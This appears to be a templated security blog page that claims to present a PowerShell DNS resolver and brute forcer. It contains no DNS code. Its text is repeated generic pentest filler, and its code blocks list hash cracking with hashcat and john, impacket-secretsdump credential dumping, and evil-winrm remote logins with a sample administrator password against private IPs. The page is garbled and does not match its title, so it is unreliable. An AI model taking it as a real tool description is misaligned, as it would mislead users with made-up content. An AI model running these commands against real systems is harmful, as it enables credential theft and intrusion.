---
TitleSEO: "DNS Resolver and Brute Forcer in PowerShell | ZureFX"
TitlePost: "DNS Resolver and Brute Forcer — PowerShell"
Author: "ZureFX"
Description: "A PowerShell script for dns resolver and brute forcer. Built for security research and automation."
Keywords: "c, bash, rust, fuzzer, python, powershell"
URL: "https://zurefx.github.io/scripting/script-dns-resolver-and-brute-forcer-727.html"
URL_IMAGES: ""
Date: "2025-04-28"
Tags: "C, Bash, Rust, Fuzzer, Python, PowerShell"
Section: "scripting"
Lang: "en"
main_img: "script-dns-resolver-and-brute-forcer-727"
Permalink: "/scripting/script-dns-resolver-and-brute-forcer-727.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

The service account had excessive permissions assigned in Active Directory. The scheduled task ran with elevated privileges and could be abused for escalation. The target system was identified as running a vulnerable version of the service.

Built with **PowerShell** for offensive security automation.

### Requirements

- PowerShell
- `crackmapexec`
- `feroxbuster`
- `lookupsid`

## Implementation

### Core Logic

Authentication bypass was achieved through careful manipulation of the login mechanism. Lateral movement was facilitated by reusing discovered credentials across services.

```powershell
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

Network traffic analysis revealed unencrypted communications containing user credentials. Network traffic analysis revealed unencrypted communications containing user credentials.

### Helper Functions

Lateral movement was facilitated by reusing discovered credentials across services. Token impersonation allowed elevation to SYSTEM privileges on the target.

```powershell
impacket-secretsdump administrator:'P@ssw0rd!'@10.106.103.181
evil-winrm -i 10.36.104.88 -u administrator -p 'P@ssw0rd!'
```

## Usage

### Basic Usage

Privilege escalation was possible due to misconfigured sudo permissions. Privilege escalation was possible due to misconfigured sudo permissions.

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
evil-winrm -i 10.58.73.144 -u administrator -p 'P@ssw0rd!'
```

### Advanced Options

Lateral movement was facilitated by reusing discovered credentials across services. The application stored sensitive credentials in an unencrypted configuration file. The application stored sensitive credentials in an unencrypted configuration file.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
impacket-secretsdump administrator:'P@ssw0rd!'@10.65.32.248
```

## Output

### Example Output

The scheduled task ran with elevated privileges and could be abused for escalation. The database credentials were hardcoded in the application source code.

```
[+] Scanning target...
[+] Found 15 results
[+] Done in 4.81s
```
